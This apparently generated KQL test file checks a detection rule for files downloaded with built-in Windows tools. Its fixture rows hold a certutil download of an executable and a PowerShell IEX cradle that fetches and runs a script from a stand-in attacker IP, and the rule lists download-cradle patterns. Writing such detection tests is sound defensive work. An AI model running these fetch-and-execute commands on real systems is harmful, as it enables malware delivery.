// Test: lolbin-file-download
// Rule: File downloaded with a built-in Windows tool (detections/lolbin-file-download.yaml)
// certutil -urlcache and a PowerShell download cradle fire; certutil -hashfile and a plain status check with Invoke-WebRequest don't.
// Generated by tools/build_tests.py from tests/cases/lolbin-file-download.yaml. Do not edit by hand.
let DeviceProcessEvents = datatable(AgoSeconds:long, DeviceName:string, AccountName:string, FileName:string, FolderPath:string, ProcessCommandLine:string, ProcessVersionInfoOriginalFileName:string, SHA256:string, InitiatingProcessFileName:string, InitiatingProcessCommandLine:string, InitiatingProcessParentFileName:string) [
    600, "fin-ws-07", "mallory", "certutil.exe", "", "certutil.exe -urlcache -split -f http://198.51.100.9/a.exe C:\\Users\\Public\\a.exe", "", "", "cmd.exe", "", "",
    600, "fin-ws-08", "mallory", "powershell.exe", "", "powershell.exe -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.9/s.ps1')\"", "", "", "cmd.exe", "", "",
    600, "it-ws-01", "alice", "certutil.exe", "", "certutil.exe -hashfile C:\\temp\\setup.msi SHA256", "", "", "cmd.exe", "", "",
    600, "it-ws-02", "bob", "powershell.exe", "", "powershell.exe Invoke-WebRequest https://status.contoso.com/health -UseBasicParsing", "", "", "explorer.exe", "", ""
]
| extend TimeGenerated = now() - AgoSeconds * 1s
| project-away AgoSeconds;
let RuleResults = () {
DeviceProcessEvents
| where TimeGenerated > ago(1h)
| where (FileName =~ "certutil.exe" and ProcessCommandLine matches regex @"(?i)[-/](urlcache|verifyctl)\b" and ProcessCommandLine contains "http")
    or (FileName =~ "bitsadmin.exe" and ProcessCommandLine matches regex @"(?i)/(transfer|addfile)\b")
    or (FileName =~ "mshta.exe" and ProcessCommandLine matches regex @"(?i)https?://|javascript:|vbscript:")
    or (FileName =~ "regsvr32.exe" and ProcessCommandLine matches regex @"(?i)/i:\s*https?://|scrobj")
    or (FileName in~ ("powershell.exe", "pwsh.exe")
        and ProcessCommandLine matches regex @"(?i)downloadstring|downloadfile|downloaddata|invoke-webrequest|\biwr\b|invoke-restmethod|\birm\b|net\.webclient|start-bitstransfer"
        and ProcessCommandLine matches regex @"(?i)\biex\b|invoke-expression|-outfile\s+\S+\.(exe|dll|ps1|hta|bat|vbs|js)|\.(exe|dll|ps1|hta)['""\s]*\)?\s*$")
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
};
RuleResults()
| summarize Rows = count(), Include1 = countif(tostring(DeviceName) == "fin-ws-07"), Include2 = countif(tostring(DeviceName) == "fin-ws-08"), Exclude1 = countif(tostring(DeviceName) == "it-ws-01"), Exclude2 = countif(tostring(DeviceName) == "it-ws-02")
| extend Test = "lolbin-file-download", Expected = "2 row(s); 2 must appear; 2 must not"
| extend Result = iff(Rows == 2 and Include1 >= 1 and Include2 >= 1 and Exclude1 == 0 and Exclude2 == 0, "PASS", "FAIL")
| project Test, Result, Rows, Expected
